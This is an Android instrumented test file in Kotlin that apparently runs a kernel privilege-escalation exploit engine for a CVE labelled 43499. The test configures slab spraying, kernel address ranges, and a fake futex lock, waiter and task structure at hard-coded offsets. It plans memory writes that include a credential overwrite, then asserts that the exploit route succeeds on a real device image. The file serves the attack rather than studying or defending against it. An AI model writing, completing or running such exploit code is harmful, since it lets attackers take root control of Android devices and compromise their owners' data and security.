package com.ghostlock.app

import androidx.test.ext.junit.runners.AndroidJUnit4
import com.ghostlock.app.backend.cve43499.ktstep.run.Cve43499ProductionEngine
import com.ghostlock.app.backend.cve43499.ktstep.run.Cve43499ProductionFlow
import com.ghostlock.app.core.steps.StepId
import com.ghostlock.app.engine.ktstep.FutexWordsResult
import com.ghostlock.app.engine.ktstep.KernelFutexWords
import com.ghostlock.app.engine.ktstep.KtEnginePhase
import com.ghostlock.app.engine.ktstep.KtStep
import com.ghostlock.app.engine.ktstep.KtStepPlan
import com.ghostlock.app.engine.ktstep.LayoutInputs
import com.ghostlock.app.engine.ktstep.LockFields
import com.ghostlock.app.engine.ktstep.NativeJniAttemptPort
import com.ghostlock.app.engine.ktstep.NativeKernelSyscalls
import com.ghostlock.app.engine.ktstep.NativePrepare43499Port
import com.ghostlock.app.engine.ktstep.NativePrepareParams
import com.ghostlock.app.engine.ktstep.NativePrepareResult
import com.ghostlock.app.engine.ktstep.PayloadPageInputs
import com.ghostlock.app.engine.ktstep.PayloadSlots
import com.ghostlock.app.engine.ktstep.PayloadValues
import com.ghostlock.app.engine.ktstep.ProcessVictimSession
import com.ghostlock.app.engine.ktstep.SyscallResult
import com.ghostlock.app.engine.ktstep.TaskFields
import com.ghostlock.app.engine.ktstep.WaiterFields
import com.ghostlock.app.engine.ktstep.WriteMode
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith

/** AVD route gate: real prepare + real attempt + production engine; no uid claim beyond probe. */
@RunWith(AndroidJUnit4::class)
class Cve43499ProductionRouteInstrumentedTest {
    @Test
    fun productionEngineRunsPreparedRoute() = runBlocking {
        val syscalls = NativeKernelSyscalls()
        val prepare = NativePrepare43499Port()
        assertTrue(prepare.open() is SyscallResult.Ok)
        val prepared = prepare.prepare(
            NativePrepareParams(
                pageSize = 4096, mmStructSize = 1024, mmSlabOrder = 2, collisions = 4,
                threadCount = 4, possibleCpus = 8, proofCount = 4, proofSeed = 0,
                rangeStart = 0xffffff8000000000uL.toLong(), rangeEnd = 0xffffffc000000000uL.toLong(),
                counterOffset = 0x1000, wakeRounds = 64, roundTimeoutUs = 1000, headerBytes = 0x1000,
                totalPokes = 32768, wordBytes = 8, handleBytes = 8, preGroups = 1,
                preShapedGroups = 0, sprayGroups = 1, postGroups = 1, leakGroups = 1,
                snitchCollisions = 4, maxAttempts = 4, pollRounds = 64, socketBuffer = 0x100000,
                mainCpu = 0, sweepTags = false,
            ),
        )
        assertTrue(prepared is NativePrepareResult.Ok)
        val facts = prepared as NativePrepareResult.Ok
        val base = facts.base + (-0xE80L)
        val words = when (val made = KernelFutexWords.create(syscalls, waitTimeoutNs = -1L)) {
            is FutexWordsResult.Ok -> made.words
            is FutexWordsResult.Errno -> error("words:" + made.code)
        }
        val layout = LayoutInputs(0x10000010001L, 0xFFFFFF802ABFD588uL.toLong(), 0x10L, 0x20L, 8)
        val page = PayloadPageInputs(
            slots = PayloadSlots(0x0E80, 0x1180, 0x1280, 0x1080, 0x0F80),
            lock = LockFields(0, 8, 16, 24),
            waiter = WaiterFields(0, 8, 16, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x44, 0x48, 0x50),
            task = TaskFields(0x40, 0x84, 0x8C, 0x90C, 0x920, 0x930, 0x938, 0x348),
            values = PayloadValues(0x100, 120, 140),
            waiterWord = base + 0x1180L, waiterTask = 0L,
            fakeTask = base + 0x1280L, fakeLock = base + 0x0E80L,
            taskGroup = 0L, piTopTask = 0L, pointerBytes = 8,
        )
        val plan = KtStepPlan(
            steps = mapOf(
                StepId.W1 to KtStep(StepId.W1, base, WriteMode.Zero, true),
                StepId.W2 to KtStep(StepId.W2, base + 0x200L, WriteMode.Credential, true, layout.credentialValue),
                StepId.W3 to KtStep(StepId.W3, base + 0x400L, WriteMode.Zero, false),
            ),
            layoutInputs = layout, pageInputs = page, pageSize = 0x8000,
        )
        val attempt = NativeJniAttemptPort()
        assertTrue(attempt.open() is SyscallResult.Ok)
        try {
            val flow = Cve43499ProductionFlow({ ProcessVictimSession() }) { runPlan, probe ->
                val actual = (probe.uid() as? SyscallResult.Ok)?.value
                assertTrue("probe before route", actual != null)
                Cve43499ProductionEngine(facts, words, attempt, probe).run(runPlan.copy(expectedUid = actual!!))
            }
            val outcome = flow.run(plan)
            assertTrue(outcome.reason ?: "phase", outcome.phase == KtEnginePhase.Succeeded)
        } finally {
            attempt.close()
            words.close()
            syscalls.close(facts.shapingFd)
            syscalls.close(facts.shapingPeerFd)
            prepare.close()
        }
    }
}
